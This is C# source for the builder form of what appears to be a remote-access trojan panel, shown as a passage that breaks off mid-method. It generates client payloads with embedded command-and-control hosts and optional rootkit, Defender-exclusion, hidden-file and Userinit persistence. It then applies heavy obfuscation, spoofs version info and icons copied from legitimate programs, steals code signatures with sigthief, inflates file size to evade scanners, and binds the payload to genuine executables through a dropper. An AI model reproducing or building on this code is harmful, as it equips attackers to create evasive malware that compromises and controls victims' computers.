using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows.Forms;
using CustomControls.RJControls;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using MaterialSkin;
using MaterialSkin.Controls;
using Newtonsoft.Json;
using Obfuscator.Obfuscator.CtrlFlow;
using Obfuscator.Obfuscator.IntProtect;
using Obfuscator.Obfuscator.Junk;
using Obfuscator.Obfuscator.ManyProxy;
using Obfuscator.Obfuscator.Mixer;
using Obfuscator.Obfuscator.Proxy;
using Obfuscator.Obfuscator.Rename;
using Server.Data;
using Server.Helper;
using Server.Helper.Bulider;
using Vestris.ResourceLib;

namespace Server.Forms;

public class FormBulider : FormMaterial
{
	private IContainer components;

	private MaterialTabControl materialTabControl1;

	private TabPage tabPage1;

	private TabPage tabPage2;

	private TabPage tabPage3;

	private TabPage tabPage4;

	private DataGridViewTextBoxColumn Column1;

	private RJButton rjButton2;

	private RJTextBox rjTextBox1;

	private RJButton rjButton1;

	private CheckBox checkBox1;

	private Panel panel1;

	private CheckBox checkBox4;

	private RJTextBox rjTextBox3;

	private RJComboBox rjComboBox1;

	private CheckBox checkBox5;

	private RJComboBox rjComboBox2;

	private RJTextBox rjTextBox4;

	private CheckBox checkBox6;

	private RJTextBox rjTextBox5;

	private CheckBox checkBox8;

	private CheckBox checkBox9;

	private Panel panel3;

	private CheckBox checkBox20;

	private PictureBox pictureBox1;

	private Panel panel4;

	private RJButton rjButton3;

	private CheckBox checkBox21;

	private RJTextBox TextBoxFileVersion;

	private RJTextBox TextBoxProductVersion;

	private RJTextBox TextBoxOriginalFileName;

	private RJTextBox TextBoxTrademarks;

	private RJTextBox TextBoxCopyright;

	private RJTextBox TextBoxCompany;

	private RJTextBox TextBoxDescription;

	private RJTextBox TextBoxProduct;

	private RJTextBox rjTextBox7;

	private RJButton rjButton5;

	private CheckBox checkBox22;

	private DataGridView GridIps;

	private RJButton rjButton4;

	private RJTextBox rjTextBox6;

	public RJTextBox rjTextBox2;

	private RJButton rjButton6;

	private ImageList imageList1;

	private RJButton rjButton7;

	private RJButton rjButton8;

	private RJButton rjButton9;

	private RJButton rjButton10;

	private CheckBox checkBox7;

	private RJButton rjButton12;

	private RJButton rjButton11;

	public FormBulider()
	{
		InitializeComponent();
	}

	private void FormBulider_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		if (File.Exists("local\\Settings.json"))
		{
			Settings settings = JsonConvert.DeserializeObject<Settings>(File.ReadAllText("local\\Settings.json"));
			rjTextBox1.Texts = "0.0.0.0:" + string.Join(",", (IEnumerable<string>)settings.Ports);
		}
		if (File.Exists("local\\Bulider.json"))
		{
			BulidData bulidData = JsonConvert.DeserializeObject<BulidData>(File.ReadAllText("local\\Bulider.json"));
			checkBox20.Checked = bulidData.CheckIcon;
			checkBox21.Checked = bulidData.CheckAssembly;
			checkBox22.Checked = bulidData.DigitalSignature;
			if (bulidData.CheckIcon)
			{
				File.WriteAllBytes("local\\temp.ico", bulidData.Icon);
				pictureBox1.ImageLocation = "local\\temp.ico";
			}
			string[] hosts = bulidData.Hosts;
			foreach (string value in hosts)
			{
				DataGridViewRow dataGridViewRow = new DataGridViewRow();
				dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = value
				});
				GridIps.Rows.Add(dataGridViewRow);
			}
			TextBoxProduct.Texts = bulidData.Product;
			TextBoxDescription.Texts = bulidData.Description;
			TextBoxCompany.Texts = bulidData.Company;
			TextBoxCopyright.Texts = bulidData.Copyright;
			TextBoxTrademarks.Texts = bulidData.Trademarks;
			TextBoxOriginalFileName.Texts = bulidData.OriginalFilename;
			TextBoxProductVersion.Texts = bulidData.ProductVersion;
			TextBoxFileVersion.Texts = bulidData.FileVersion;
			checkBox1.Checked = bulidData.Install;
			checkBox8.Checked = bulidData.ExclusionWD;
			checkBox6.Checked = bulidData.HiddenFile;
			checkBox4.Checked = bulidData.RootKit;
			checkBox9.Checked = bulidData.Pump;
			checkBox7.Checked = bulidData.UserInit;
			checkBox5.Checked = bulidData.InstallWatchDog;
			rjTextBox2.Texts = bulidData.TaskClient;
			rjTextBox5.Texts = bulidData.TaskWatchDog;
			rjComboBox1.Texts = bulidData.PathClientCmb;
			rjTextBox3.Texts = bulidData.PathClientBox;
			rjComboBox2.Texts = bulidData.PathWatchDogCmb;
			rjTextBox4.Texts = bulidData.PathWatchDogBox;
			rjTextBox7.Texts = bulidData.Group;
			rjTextBox6.Texts = bulidData.Mutex;
		}
		checkBox20.CheckedChanged += checkBox20_CheckedChanged;
		base.FormClosing += delegate
		{
			BulidData bulidData2 = new BulidData
			{
				CheckIcon = checkBox20.Checked,
				CheckAssembly = checkBox21.Checked,
				DigitalSignature = checkBox22.Checked,
				Icon = (checkBox20.Checked ? File.ReadAllBytes(pictureBox1.ImageLocation) : null),
				Product = TextBoxProduct.Texts,
				Description = TextBoxDescription.Texts,
				Company = TextBoxCompany.Texts,
				Copyright = TextBoxCopyright.Texts,
				Trademarks = TextBoxTrademarks.Texts,
				OriginalFilename = TextBoxOriginalFileName.Texts,
				ProductVersion = TextBoxProductVersion.Texts,
				FileVersion = TextBoxFileVersion.Texts,
				Install = checkBox1.Checked,
				ExclusionWD = checkBox8.Checked,
				HiddenFile = checkBox6.Checked,
				RootKit = checkBox4.Checked,
				Pump = checkBox9.Checked,
				UserInit = checkBox7.Checked,
				InstallWatchDog = checkBox5.Checked,
				TaskClient = rjTextBox2.Texts,
				TaskWatchDog = rjTextBox5.Texts,
				PathClientCmb = rjComboBox1.Texts,
				PathClientBox = rjTextBox3.Texts,
				PathWatchDogCmb = rjComboBox2.Texts,
				PathWatchDogBox = rjTextBox4.Texts,
				Group = rjTextBox7.Texts,
				Mutex = rjTextBox6.Texts
			};
			List<string> list = new List<string>();
			foreach (DataGridViewRow item in (IEnumerable)GridIps.Rows)
			{
				list.Add((string)item.Cells[0].Value);
			}
			bulidData2.Hosts = list.ToArray();
			File.WriteAllText("local\\Bulider.json", JsonConvert.SerializeObject(bulidData2, Formatting.Indented));
		};
	}

	private void ChangeScheme(object sender)
	{
		rjTextBox1.BorderColor = FormMaterial.PrimaryColor;
		rjTextBox2.BorderColor = FormMaterial.PrimaryColor;
		rjTextBox3.BorderColor = FormMaterial.PrimaryColor;
		rjTextBox4.BorderColor = FormMaterial.PrimaryColor;
		rjTextBox5.BorderColor = FormMaterial.PrimaryColor;
		rjTextBox6.BorderColor = FormMaterial.PrimaryColor;
		rjTextBox7.BorderColor = FormMaterial.PrimaryColor;
		TextBoxOriginalFileName.BorderColor = FormMaterial.PrimaryColor;
		TextBoxDescription.BorderColor = FormMaterial.PrimaryColor;
		TextBoxCompany.BorderColor = FormMaterial.PrimaryColor;
		TextBoxProduct.BorderColor = FormMaterial.PrimaryColor;
		TextBoxCopyright.BorderColor = FormMaterial.PrimaryColor;
		TextBoxTrademarks.BorderColor = FormMaterial.PrimaryColor;
		TextBoxFileVersion.BorderColor = FormMaterial.PrimaryColor;
		TextBoxProductVersion.BorderColor = FormMaterial.PrimaryColor;
		rjComboBox2.BorderColor = FormMaterial.PrimaryColor;
		rjComboBox1.BorderColor = FormMaterial.PrimaryColor;
		rjButton1.BackColor = FormMaterial.PrimaryColor;
		rjButton2.BackColor = FormMaterial.PrimaryColor;
		rjButton3.BackColor = FormMaterial.PrimaryColor;
		rjButton4.BackColor = FormMaterial.PrimaryColor;
		rjButton5.BackColor = FormMaterial.PrimaryColor;
		rjButton6.BackColor = FormMaterial.PrimaryColor;
		rjButton7.BackColor = FormMaterial.PrimaryColor;
		rjButton8.BackColor = FormMaterial.PrimaryColor;
		rjButton9.BackColor = FormMaterial.PrimaryColor;
		rjButton10.BackColor = FormMaterial.PrimaryColor;
		rjButton11.BackColor = FormMaterial.PrimaryColor;
		rjButton12.BackColor = FormMaterial.PrimaryColor;
		GridIps.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
		GridIps.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		GridIps.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
		GridIps.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
	}

	private void checkBox1_CheckedChanged(object sender, EventArgs e)
	{
		panel1.Enabled = checkBox1.Checked;
	}

	private void checkBox5_CheckedChanged(object sender, EventArgs e)
	{
		rjTextBox4.Enabled = checkBox5.Checked;
		rjComboBox2.Enabled = checkBox5.Checked;
		rjTextBox5.Enabled = checkBox5.Checked;
	}

	private void WriteSettings(ModuleDefMD moduleDefMd)
	{
		string randomCharactersAscii = Randomizer.getRandomCharactersAscii();
		string randomCharactersAscii2 = Randomizer.getRandomCharactersAscii();
		string randomCharactersAscii3 = Randomizer.getRandomCharactersAscii();
		EncryptString encryptString = new EncryptString();
		string str = " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~";
		encryptString.dec = Methods.Shuffle(str);
		encryptString.enc = Methods.Shuffle(encryptString.dec);
		X509Certificate2 x509Certificate = new X509Certificate2(new X509Certificate2("ServerCertificate.p12", "", X509KeyStorageFlags.Exportable).Export(X509ContentType.Cert));
		moduleDefMd.Resources.Add(new EmbeddedResource(randomCharactersAscii, Xor.DecodEncod(x509Certificate.Export(X509ContentType.Cert), Encoding.ASCII.GetBytes(randomCharactersAscii3))));
		if (checkBox4.Checked)
		{
			moduleDefMd.Resources.Add(new EmbeddedResource(randomCharactersAscii2, Xor.DecodEncod(File.ReadAllBytes("Stub\\UserMode.obf.dll"), Encoding.ASCII.GetBytes(randomCharactersAscii3))));
		}
		foreach (TypeDef type in moduleDefMd.Types)
		{
			foreach (MethodDef method in type.Methods)
			{
				if (method.Body == null)
				{
					continue;
				}
				for (int i = 0; i < method.Body.Instructions.Count(); i++)
				{
					if (method.Body.Instructions[i].OpCode != OpCodes.Ldstr)
					{
						continue;
					}
					if (type.Name != "EncryptString")
					{
						if (!(type.Name == "Config"))
						{
							method.Body.Instructions[i].Operand = encryptString.Encrypt(method.Body.Instructions[i].Operand as string);
							continue;
						}
						if (method.Body.Instructions[i].Operand as string == "Software\\gogoduck" || method.Body.Instructions[i].Operand as string == "Win32_Processor" || method.Body.Instructions[i].Operand as string == "Name" || method.Body.Instructions[i].Operand as string == "dd.MM.yyyy" || method.Body.Instructions[i].Operand as string == "Win32_VideoController" || method.Body.Instructions[i].Operand as string == "," || method.Body.Instructions[i].Operand as string == "Admin" || method.Body.Instructions[i].Operand as string == "User" || method.Body.Instructions[i].Operand as string == "true")
						{
							method.Body.Instructions[i].Operand = encryptString.Encrypt(method.Body.Instructions[i].Operand as string);
						}
					}
					if (type.Name == "EncryptString")
					{
						if (method.Body.Instructions[i].Operand as string == "%dec%")
						{
							method.Body.Instructions[i].Operand = encryptString.dec;
						}
						if (method.Body.Instructions[i].Operand as string == "%enc%")
						{
							method.Body.Instructions[i].Operand = encryptString.enc;
						}
						continue;
					}
					if (method.Body.Instructions[i].Operand as string == "%Hosts%")
					{
						List<string> list = new List<string>();
						foreach (DataGridViewRow item in (IEnumerable)GridIps.Rows)
						{
							list.Add((string)item.Cells[0].Value);
						}
						method.Body.Instructions[i].Operand = encryptString.Encrypt(string.Join(";", list));
					}
					if (method.Body.Instructions[i].Operand as string == "%Version%")
					{
						method.Body.Instructions[i].Operand = encryptString.Encrypt("1.8");
					}
					if (method.Body.Instructions[i].Operand as string == "%Group%")
					{
						method.Body.Instructions[i].Operand = encryptString.Encrypt(rjTextBox7.Texts);
					}
					if (method.Body.Instructions[i].Operand as string == "%Mutex%")
					{
						method.Body.Instructions[i].Operand = encryptString.Encrypt(rjTextBox6.Texts);
					}
					if (method.Body.Instructions[i].Operand as string == "%Key%")
					{
						method.Body.Instructions[i].Operand = encryptString.Encrypt(randomCharactersAscii3);
					}
					if (method.Body.Instructions[i].Operand as string == "%Cerificate%")
					{
						method.Body.Instructions[i].Operand = encryptString.Encrypt(randomCharactersAscii);
					}
					if (method.Body.Instructions[i].Operand as string == "%Install%")
					{
						method.Body.Instructions[i].Operand = encryptString.Encrypt(checkBox1.Checked.ToString().ToLower());
					}
					if (method.Body.Instructions[i].Operand as string == "%AntiVirtual%")
					{
						method.Body.Instructions[i].Operand = encryptString.Encrypt(true.ToString().ToLower());
					}
					if (checkBox1.Checked)
					{
						if (method.Body.Instructions[i].Operand as string == "%InstallWatchDog%")
						{
							method.Body.Instructions[i].Operand = encryptString.Encrypt(checkBox5.Checked.ToString().ToLower());
						}
						if (method.Body.Instructions[i].Operand as string == "%UseInstallAdmin%")
						{
							method.Body.Instructions[i].Operand = encryptString.Encrypt(true.ToString().ToLower());
						}
						if (method.Body.Instructions[i].Operand as string == "%ExclusionWD%")
						{
							method.Body.Instructions[i].Operand = encryptString.Encrypt(checkBox8.Checked.ToString().ToLower());
						}
						if (method.Body.Instructions[i].Operand as string == "%HiddenFile%")
						{
							method.Body.Instructions[i].Operand = encryptString.Encrypt(checkBox6.Checked.ToString().ToLower());
						}
						if (method.Body.Instructions[i].Operand as string == "%UserInit%")
						{
							method.Body.Instructions[i].Operand = encryptString.Encrypt(checkBox7.Checked.ToString().ToLower());
						}
						if (method.Body.Instructions[i].Operand as string == "%RootKit%")
						{
							if (checkBox4.Checked)
							{
								method.Body.Instructions[i].Operand = encryptString.Encrypt(randomCharactersAscii2);
							}
							else
							{
								method.Body.Instructions[i].Operand = encryptString.Encrypt("false");
							}
						}
						if (method.Body.Instructions[i].Operand as string == "%Pump%")
						{
							method.Body.Instructions[i].Operand = encryptString.Encrypt(checkBox9.Checked.ToString().ToLower());
						}
						if (method.Body.Instructions[i].Operand as string == "%TaskClient%")
						{
							method.Body.Instructions[i].Operand = encryptString.Encrypt(rjTextBox2.Texts);
						}
						if (method.Body.Instructions[i].Operand as string == "%PathClient%")
						{
							method.Body.Instructions[i].Operand = encryptString.Encrypt(Path.Combine(rjComboBox1.Texts, rjTextBox3.Texts));
						}
						if (method.Body.Instructions[i].Operand as string == "%TaskWatchDog%")
						{
							if (checkBox5.Checked)
							{
								method.Body.Instructions[i].Operand = encryptString.Encrypt(rjTextBox5.Texts);
							}
							else
							{
								method.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
							}
						}
						if (method.Body.Instructions[i].Operand as string == "%PathWatchDog%")
						{
							if (checkBox5.Checked)
							{
								method.Body.Instructions[i].Operand = encryptString.Encrypt(Path.Combine(rjComboBox2.Texts, rjTextBox4.Texts));
							}
							else
							{
								method.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
							}
						}
					}
					else
					{
						if (method.Body.Instructions[i].Operand as string == "%InstallWatchDog%")
						{
							method.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (method.Body.Instructions[i].Operand as string == "%UseInstallAdmin%")
						{
							method.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (method.Body.Instructions[i].Operand as string == "%ExclusionWD%")
						{
							method.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (method.Body.Instructions[i].Operand as string == "%HiddenFile%")
						{
							method.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (method.Body.Instructions[i].Operand as string == "%UserInit%")
						{
							method.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (method.Body.Instructions[i].Operand as string == "%PathWatchDog%")
						{
							method.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (method.Body.Instructions[i].Operand as string == "%TaskWatchDog%")
						{
							method.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (method.Body.Instructions[i].Operand as string == "%Pump%")
						{
							method.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (method.Body.Instructions[i].Operand as string == "%TaskClient%")
						{
							method.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
						if (method.Body.Instructions[i].Operand as string == "%PathClient%")
						{
							method.Body.Instructions[i].Operand = encryptString.Encrypt(Randomizer.getRandomCharacters());
						}
					}
				}
			}
		}
	}

	private void checkBox20_CheckedChanged(object sender, EventArgs e)
	{
		if (!checkBox20.Checked)
		{
			return;
		}
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Title = "Choose Icon";
		openFileDialog.Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico";
		openFileDialog.Multiselect = false;
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			if (openFileDialog.FileName.ToLower().EndsWith(".exe"))
			{
				pictureBox1.ImageLocation = Methods.GetIcon(openFileDialog.FileName);
			}
			else
			{
				pictureBox1.ImageLocation = openFileDialog.FileName;
			}
		}
	}

	private void rjButton3_Click(object sender, EventArgs e)
	{
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = "Executable (*.exe)|*.exe";
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);
			TextBoxOriginalFileName.Texts = versionInfo.InternalName ?? string.Empty;
			TextBoxDescription.Texts = versionInfo.FileDescription ?? string.Empty;
			TextBoxCompany.Texts = versionInfo.CompanyName ?? string.Empty;
			TextBoxProduct.Texts = versionInfo.ProductName ?? string.Empty;
			TextBoxCopyright.Texts = versionInfo.LegalCopyright ?? string.Empty;
			TextBoxTrademarks.Texts = versionInfo.LegalTrademarks ?? string.Empty;
			TextBoxFileVersion.Texts = versionInfo.FileMajorPart + "." + versionInfo.FileMinorPart + "." + versionInfo.FileBuildPart + "." + versionInfo.FilePrivatePart;
			TextBoxProductVersion.Texts = versionInfo.FileMajorPart + "." + versionInfo.FileMinorPart + "." + versionInfo.FileBuildPart + "." + versionInfo.FilePrivatePart;
		}
	}

	private void CreateBulid(string filepath)
	{
		ConsoleLogger.LogBuild($"Starting build process for: {Path.GetFileName(filepath)}");
		
		string exd = "";
		string text = filepath;
		if (checkBox22.Checked)
		{
			ConsoleLogger.LogBuild("Digital signature enabled");
			if (text.EndsWith(".exe"))
			{
				exd = ".exe";
			}
			if (text.EndsWith(".scr"))
			{
				exd = ".scr";
			}
			text = text.Replace(".exe", "").Replace(".scr", "");
		}
		
		ConsoleLogger.LogBuild("Loading client stub...");
		using (ModuleDefMD moduleDefMD = ModuleDefMD.Load("Stub\\Client.exe"))
		{
			ConsoleLogger.LogBuild("Writing configuration settings...");
			WriteSettings(moduleDefMD);
			
			ConsoleLogger.LogBuild("Applying obfuscation - Mixer...");
			Mixer.Execute(moduleDefMD);
			
			ConsoleLogger.LogBuild("Applying obfuscation - Control Flow...");
			ControlFlowObfuscation.Execute(moduleDefMD);
			
			ConsoleLogger.LogBuild("Applying obfuscation - Proxy String...");
			ProxyString.Execute(moduleDefMD);
			
			ConsoleLogger.LogBuild("Applying obfuscation - Many Proxy...");
			ManyProxy.Execute(moduleDefMD);
			
			ConsoleLogger.LogBuild("Applying obfuscation - Proxy Call...");
			ProxyCall.Execute(moduleDefMD);
			
			ConsoleLogger.LogBuild("Applying obfuscation - Junks...");
			Junks.Execute(moduleDefMD);
			
			ConsoleLogger.LogBuild("Applying obfuscation - Renamer...");
			Renamer.Execute(moduleDefMD);
			
			ConsoleLogger.LogBuild("Writing obfuscated module to file...");
			moduleDefMD.Write(text);
			moduleDefMD.Dispose();
		}
		
		if (checkBox21.Checked)
		{
			ConsoleLogger.LogBuild("Writing assembly information...");
			WriteAssembly(text);
		}
		
		if (checkBox20.Checked && !string.IsNullOrEmpty(pictureBox1.ImageLocation))
		{
			ConsoleLogger.LogBuild("Injecting custom icon...");
			IconInjector.InjectIcon(text, pictureBox1.ImageLocation);
		}
		
		if (checkBox22.Checked)
		{
			ConsoleLogger.LogBuild("Applying digital signature...");
			PatchSignature(text, exd);
		}
		
		ConsoleLogger.LogSuccess($"Build completed successfully: {Path.GetFileName(filepath)}");
	}

	private void rjButton5_Click(object sender, EventArgs e)
	{
		using SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.Filter = ".exe (*.exe)|*.exe|.scr (*.scr)|*.scr";
		saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
		saveFileDialog.OverwritePrompt = false;
		saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + ".exe";
		if (saveFileDialog.ShowDialog() == DialogResult.OK)
		{
			CreateBulid(saveFileDialog.FileName);
			MessageBox.Show("Build Create!");
		}
	}

	private void PatchSignature(string tmp, string exd)
	{
		string[] files = Directory.GetFiles("Signatures");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "Scripts\\sigthief.exe";
		processStartInfo.Arguments = " -s \"" + Path.Combine(Application.StartupPath, files[Randomizer.random.Next(files.Length)]) + "\" -t \"" + tmp + "\" -o \"" + tmp + exd + "\"";
		Process.Start(processStartInfo).WaitForExit();
		File.Delete(tmp);
	}

	private void WriteAssembly(string filename, string filenameto)
	{
		try
		{
			FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(filename);
			VersionResource versionResource = new VersionResource();
			versionResource.LoadFrom(filenameto);
			versionResource.FileVersion = versionInfo.FileVersion;
			versionResource.ProductVersion = versionInfo.ProductVersion;
			versionResource.Language = 0;
			StringFileInfo obj = (StringFileInfo)versionResource["StringFileInfo"];
			obj["ProductName"] = versionInfo.ProductName ?? string.Empty;
			obj["FileDescription"] = versionInfo.FileDescription ?? string.Empty;
			obj["CompanyName"] = versionInfo.CompanyName ?? string.Empty;
			obj["LegalCopyright"] = versionInfo.LegalCopyright ?? string.Empty;
			obj["LegalTrademarks"] = versionInfo.LegalTrademarks ?? string.Empty;
			obj["Assembly Version"] = versionResource.ProductVersion;
			obj["InternalName"] = versionInfo.InternalName ?? string.Empty;
			obj["OriginalFilename"] = versionInfo.InternalName ?? string.Empty;
			obj["ProductVersion"] = versionResource.ProductVersion;
			obj["FileVersion"] = versionResource.FileVersion;
			versionResource.SaveTo(filenameto);
		}
		catch (Exception ex)
		{
			throw new ArgumentException("Assembly: " + ex.Message);
		}
	}

	private void WriteAssembly(string filename)
	{
		try
		{
			VersionResource versionResource = new VersionResource();
			versionResource.LoadFrom(filename);
			versionResource.FileVersion = TextBoxFileVersion.Texts;
			versionResource.ProductVersion = TextBoxProductVersion.Texts;
			versionResource.Language = 0;
			StringFileInfo obj = (StringFileInfo)versionResource["StringFileInfo"];
			obj["ProductName"] = TextBoxProduct.Texts;
			obj["FileDescription"] = TextBoxDescription.Texts;
			obj["CompanyName"] = TextBoxCompany.Texts;
			obj["LegalCopyright"] = TextBoxCopyright.Texts;
			obj["LegalTrademarks"] = TextBoxTrademarks.Texts;
			obj["Assembly Version"] = versionResource.ProductVersion;
			obj["InternalName"] = TextBoxOriginalFileName.Texts;
			obj["OriginalFilename"] = TextBoxOriginalFileName.Texts;
			obj["ProductVersion"] = versionResource.ProductVersion;
			obj["FileVersion"] = versionResource.FileVersion;
			versionResource.SaveTo(filename);
		}
		catch (Exception ex)
		{
			throw new ArgumentException("Assembly: " + ex.Message);
		}
	}

	private void rjButton1_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Contains(":") && !string.IsNullOrEmpty(rjTextBox1.Texts))
		{
			DataGridViewRow dataGridViewRow = new DataGridViewRow();
			dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
			{
				Value = rjTextBox1.Texts
			});
			GridIps.Rows.Add(dataGridViewRow);
			rjTextBox1.Texts = "";
		}
	}

	private void rjButton2_Click(object sender, EventArgs e)
	{
		foreach (DataGridViewRow selectedRow in GridIps.SelectedRows)
		{
			GridIps.Rows.Remove(selectedRow);
		}
	}

	private void rjButton4_Click(object sender, EventArgs e)
	{
		rjTextBox6.Texts = Randomizer.getRandomCharacters();
	}

	private void checkBox4_CheckedChanged(object sender, EventArgs e)
	{
		if (checkBox4.Checked)
		{
			if (!rjTextBox3.Texts.Contains("xdwd"))
			{
				rjTextBox3.Texts = "xdwd" + rjTextBox3.Texts;
			}
			if (checkBox5.Checked && !rjTextBox4.Texts.Contains("xdwd"))
			{
				rjTextBox4.Texts = "xdwd" + rjTextBox4.Texts;
			}
		}
		else
		{
			if (rjTextBox3.Texts.Contains("xdwd"))
			{
				rjTextBox3.Texts = rjTextBox3.Texts.Replace("xdwd", "");
			}
			if (checkBox5.Checked && rjTextBox4.Texts.Contains("xdwd"))
			{
				rjTextBox4.Texts = rjTextBox4.Texts.Replace("xdwd", "");
			}
		}
	}

	public void Pump(string path)
	{
		using FileStream fileStream = File.Open(path, FileMode.OpenOrCreate);
		fileStream.SetLength(fileStream.Length + new Random().Next(500, 750) * 1024 * 1024);
		fileStream.Close();
	}

	private void rjButton6_Click(object sender, EventArgs e)
	{
		using SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.Filter = ".exe (*.exe)|*.exe|.scr (*.scr)|*.scr";
		saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
		saveFileDialog.OverwritePrompt = false;
		saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + ".exe";
		if (saveFileDialog.ShowDialog() == DialogResult.OK)
		{
			CreateBulid(saveFileDialog.FileName);
			Pump(saveFileDialog.FileName);
			MessageBox.Show("Build Create!");
		}
	}

	private void rjButton7_Click(object sender, EventArgs e)
	{
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Title = "Choose program";
		openFileDialog.Filter = "Files(*.exe)|*.exe";
		openFileDialog.Multiselect = false;
		if (openFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		using SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.Filter = ".exe (*.exe)|*.exe|.scr (*.scr)|*.scr";
		saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
		saveFileDialog.OverwritePrompt = false;
		saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + ".exe";
		if (saveFileDialog.ShowDialog() == DialogResult.OK)
		{
			CreateBulid(saveFileDialog.FileName);
			BulidJoin(openFileDialog.FileName, saveFileDialog.FileName);
			File.Delete(saveFileDialog.FileName);
			MessageBox.Show("Build Create!");
		}
	}

	public void BulidDropper(string bulid)
	{
		string text = bulid;
		string exd = "";
		if (checkBox22.Checked)
		{
			if (text.EndsWith(".exe"))
			{
				exd = ".exe";
			}
			if (text.EndsWith(".scr"))
			{
				exd = ".scr";
			}
			text = text.Replace(".exe", "").Replace(".scr", "");
		}
		using (ModuleDefMD moduleDefMD = ModuleDefMD.Load("Stub\\Dropper.exe"))
		{
			string randomCharacters = Randomizer.getRandomCharacters();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				BitmapCoding.ByteToBitmap(File.ReadAllBytes(bulid)).Save(memoryStream, ImageFormat.Bmp);
				moduleDefMD.Resources.Add(new EmbeddedResource(randomCharacters, memoryStream.ToArray()));
			}
			EncryptString encryptString = new EncryptString();
			string str = " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~";
			encryptString.dec = Randomizer.Shuffle(str);
			encryptString.enc = Randomizer.Shuffle(encryptString.dec);
			foreach (TypeDef type in moduleDefMD.Types)
			{
				foreach (MethodDef method in type.Methods)
				{
					if (method.Name == "WinExec")
					{
						continue;
					}
					for (int i = 0; i < method.Body.Instructions.Count; i++)
					{
						if (method.Body.Instructions[i].OpCode != OpCodes.Ldstr)
						{
							continue;
						}
						switch (method.Body.Instructions[i].Operand.ToString())
						{
						case "%enc%":
							method.Body.Instructions[i].Operand = encryptString.enc;
							continue;
						case "%dec%":
							method.Body.Instructions[i].Operand = encryptString.dec;
							continue;
						case "%name%":
							method.Body.Instructions[i].Operand = encryptString.Encrypt(randomCharacters);
							continue;
						case "%runas%":
							method.Body.Instructions[i].Operand = encryptString.Encrypt(true.ToString().ToLower());
							continue;
						case "%antivirtual%":
							method.Body.Instructions[i].Operand = encryptString.Encrypt(true.ToString().ToLower());
							continue;
						}
						if (!type.Name.Contains("Caesars"))
						{
							method.Body.Instructions[i].Operand = encryptString.Encrypt((string)method.Body.Instructions[i].Operand);
						}
					}
				}
			}
			Mixer.Execute(moduleDefMD);
			Renamer.Execute(moduleDefMD);
			ControlFlowObfuscation.Execute(moduleDefMD);
			ManyProxy.Execute(moduleDefMD);
			ProxyCall.Execute(moduleDefMD);
			ProxyString.Execute(moduleDefMD);
			Int.Execute(moduleDefMD);
			ProxyInt.Execute(moduleDefMD);
			Junks.Execute(moduleDefMD);
			moduleDefMD.Write(text);
			moduleDefMD.Dispose();
		}
		WriteAssembly(bulid, text);
		IconInjector.InjectIcon(text, Methods.GetIcon(bulid));
		if (checkBox22.Checked)
		{
			PatchSignature(text, exd);
		}
	}

	public void BulidJoin(string original, string bulid)
	{
		string text = Path.Combine(Path.GetDirectoryName(bulid), Path.GetFileName(original));
		string exd = "";
		if (checkBox22.Checked)
		{
			if (text.EndsWith(".exe"))
			{
				exd = ".exe";
			}
			if (text.EndsWith(".scr"))
			{
				exd = ".scr";
			}
			text = text.Replace(".exe", "").Replace(".scr", "");
		}
